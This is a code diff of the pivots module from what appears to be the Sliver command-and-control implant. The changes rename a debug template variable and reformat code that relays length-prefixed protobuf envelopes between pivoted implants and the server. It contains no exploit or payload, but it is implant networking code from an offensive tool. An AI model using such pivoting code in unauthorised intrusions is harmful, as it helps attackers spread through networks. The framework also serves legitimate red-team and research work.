@@ -19,7 +19,7 @@ package pivots
 */
 
 import (
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 	"bytes"
@@ -28,8 +28,8 @@ import (
 	"sync"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/golang/protobuf/proto"
 	"github.com/bishopfox/sliver/sliver/transports"
+	"github.com/golang/protobuf/proto"
 )
 
 const (
@@ -44,17 +44,16 @@ var pivotsMap = &PivotsMap{
 }
 
 type pivotsMapEntry struct {
-	Conn 			*net.Conn
-	PivotType 		string
-	RemoteAddress 	string
-	Register 		[]byte
-
+	Conn          *net.Conn
+	PivotType     string
+	RemoteAddress string
+	Register      []byte
 }
 
 // PivotsMap - struct that defines de pivots, provides atomic access
 type PivotsMap struct {
-	mutex	*sync.RWMutex
-	Pivots 	*map[uint32] *pivotsMapEntry
+	mutex  *sync.RWMutex
+	Pivots *map[uint32]*pivotsMapEntry
 }
 
 // Pivot - Get Pivot by ID
@@ -68,9 +67,9 @@ func (p *PivotsMap) Pivot(pivotID uint32) *pivotsMapEntry {
 func (p *PivotsMap) AddPivot(pivotID uint32, conn *net.Conn, t, addr string) {
 	p.mutex.Lock()
 	defer p.mutex.Unlock()
-	entry := pivotsMapEntry {
-		Conn: conn,
-		PivotType: t,
+	entry := pivotsMapEntry{
+		Conn:          conn,
+		PivotType:     t,
 		RemoteAddress: addr,
 	}
 	(*p.Pivots)[pivotID] = &entry
@@ -89,7 +88,7 @@ func Pivot(pivotID uint32) *net.Conn {
 
 // ReconnectActivePivots - Send a new PivotOpen message back to the server for each alive pivot
 func ReconnectActivePivots(connection *transports.Connection) {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("Reconnecting active pivots...")
 	// {{end}}
 	for k, v := range *pivotsMap.Pivots {
@@ -101,27 +100,27 @@ func ReconnectActivePivots(connection *transports.Connection) {
 func SendPivotOpen(pivotID uint32, registerMsg []byte, connection *transports.Connection) {
 	pivotsMap.Pivot(pivotID).Register = registerMsg
 	pivot := pivotsMap.Pivot(pivotID)
-	pivotOpen := &sliverpb.PivotOpen {
+	pivotOpen := &sliverpb.PivotOpen{
 		PivotID:       pivotID,
 		PivotType:     pivot.PivotType,
 		RemoteAddress: pivot.RemoteAddress,
-		RegisterMsg:   registerMsg,		
-  	}
+		RegisterMsg:   registerMsg,
+	}
 	data, err := proto.Marshal(pivotOpen)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println(err)
 		// {{end}}
 		return
 	}
 	// W T F!!!!!
 	if connection.IsOpen {
-		connection.Send <- &sliverpb.Envelope {
+		connection.Send <- &sliverpb.Envelope{
 			Type: sliverpb.MsgPivotOpen,
 			Data: data,
 		}
 	} else {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("Connection is not open...")
 		// {{end}}
 	}
@@ -129,18 +128,18 @@ func SendPivotOpen(pivotID uint32, registerMsg []byte, connection *transports.Co
 
 // SendPivotClose - Sends a PivotClose message back to the server
 func SendPivotClose(pivotID uint32, err error, connection *transports.Connection) {
-	pivotClose := &sliverpb.PivotClose {
+	pivotClose := &sliverpb.PivotClose{
 		PivotID: pivotID,
 		Err:     err.Error(),
 	}
 	data, err := proto.Marshal(pivotClose)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println(err)
 		// {{end}}
 		return
 	}
-	connection.Send <- &sliverpb.Envelope {
+	connection.Send <- &sliverpb.Envelope{
 		Type: sliverpb.MsgPivotClose,
 		Data: data,
 	}
@@ -150,7 +149,7 @@ func SendPivotClose(pivotID uint32, err error, connection *transports.Connection
 func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Print("Envelope marshaling error: ", err)
 		// {{end}}
 		return err
@@ -159,7 +158,7 @@ func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
 	_, err = (*conn).Write(dataLengthBuf.Bytes())
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("pivots.PivotWriteEnvelope error %v and %d\n", err, dataLengthBuf)
 		// {{end}}
 	}
@@ -168,7 +167,7 @@ func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSize])
 		totalWritten += n
 		if err2 != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
 			// {{end}}
 		}
@@ -177,7 +176,7 @@ func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		missing := len(data) - totalWritten
 		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
 			// {{end}}
 		}
@@ -190,7 +189,7 @@ func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4)
 	_, err := (*conn).Read(dataLengthBuf)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("pivots.PivotReadEnvelope error (read msg-length): %v\n", err)
 		// {{end}}
 		return nil, err
@@ -207,7 +206,7 @@ func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 			break
 		}
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Read error: %s\n", err)
 			// {{end}}
 			break
@@ -216,7 +215,7 @@ func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	envelope := &sliverpb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Unmarshaling envelope error: %v", err)
 		// {{end}}
 		return &sliverpb.Envelope{}, err
